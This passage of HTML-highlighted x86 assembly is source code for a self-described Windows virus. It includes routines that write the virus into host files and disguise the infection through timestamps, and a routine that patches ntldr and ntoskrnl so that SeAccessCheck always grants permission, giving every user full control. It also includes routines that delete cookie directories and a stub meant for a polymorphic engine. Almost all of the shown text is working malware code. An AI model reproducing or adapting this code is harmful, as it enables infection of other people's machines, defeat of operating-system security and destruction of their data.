             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_llseek</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">600</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lwrite</span><span class="sc0">                   </span><span class="sc1">; now write header</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">68</span><span class="sc0">
</span><span class="sc5">VirusOffset</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_llseek</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">RawVSize</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lwrite</span><span class="sc0">                   </span><span class="sc1">; write virus</span><span class="sc0">
                                                    

</span><span class="sc5">ExitInfect</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; mark the program as infected</span><span class="sc0">
                                               
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">FileDate</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; cl = days</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">SelF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; al = seconds</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">         </span><span class="sc1">; CreationTime</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">FileDate</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">DosDateTimeToFileTime</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">        </span><span class="sc1">; LastWriteTime</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">                              </span><span class="sc1">; LastAcessTime</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">                              </span><span class="sc1">; CreationTime</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">SetFileTime</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lclose</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; IMPORTANT : this function does a correct job under NT 4</span><span class="sc0">
</span><span class="sc1">; with sevice pack 3, but it might corrupt ntldr and</span><span class="sc0">
</span><span class="sc1">; ntoskrnl under windows 2000 (if they still exist)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">; this patch can only be implemented in administrator mode</span><span class="sc0">


</span><span class="sc5">NukeNTSecurity</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; every time NT starts, ntldr checks ntoskrnl to see</span><span class="sc0">
</span><span class="sc1">; if it hasn't been modified; if so, the system will halt.</span><span class="sc0">
</span><span class="sc1">; this protection must be removed, unless the ntoskrnl patch</span><span class="sc0">
</span><span class="sc1">; won't be accepted</span><span class="sc0">


             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTPatch1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTSig1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTFile1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">PatchFile</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Failed</span><span class="sc0">


</span><span class="sc1">; SeAccessCheck returns 00 in al if permission is denied</span><span class="sc0">
</span><span class="sc1">; and 01 if permission is given. When the patch is installed,</span><span class="sc0">
</span><span class="sc1">; the function will automatically return 01. Therefore,</span><span class="sc0">
</span><span class="sc1">; evrey user will gain total control on the whole system.</span><span class="sc0">


             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">09</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTPatch2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTSig2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTFile2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">PatchFile</span><span class="sc0">

</span><span class="sc5">Failed</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">
             

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; PatchFile( Filename, Signature, Patch, Signature Size )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">PatchFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Filename</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lopen</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EOF2</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ScanFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">400</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; File Buffer Address</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lread</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">400</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EOF</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Signature Address</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; File Buffer Address</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0400</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">Find_Sig</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1C</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Signature Size</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">cmpsb</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Success</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ScanFile</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Find_Sig</span><span class="sc0">

</span><span class="sc5">Success</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Patch Address</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1C</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Signature Size</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc4">-</span><span class="sc2">400</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_llseek</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">400</span><span class="sc0">                       
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; File Buffer Address</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lwrite</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lclose</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">          </span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">EOF</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lclose</span><span class="sc0">

</span><span class="sc5">EOF2</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
             </span><span class="sc6">stc</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">          </span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">NukeCookies</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dir1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">      </span><span class="sc1">; first, kill</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                   </span><span class="sc1">; \WINDOWS\Cookies</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">TrashDirectory</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dir2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">      </span><span class="sc1">; then, kill</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                   </span><span class="sc1">; \WINNT\Cookies</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">TrashDirectory</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">TrashDirectory</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindFirstFileA</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Valid</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Valid</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">CleanIt</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">DeleteFileA</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindNextFileA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">CleanIt</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; this fonction isn't used yet - but it will be useful for</span><span class="sc0">
</span><span class="sc1">; the polymorphic engine</span><span class="sc0">


</span><span class="sc5">GetRandNb</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RandNb</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mul</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RMul</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">div</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RDiv</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RandNb</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetEIP</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">@1</span><span class="sc0">

</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc0">
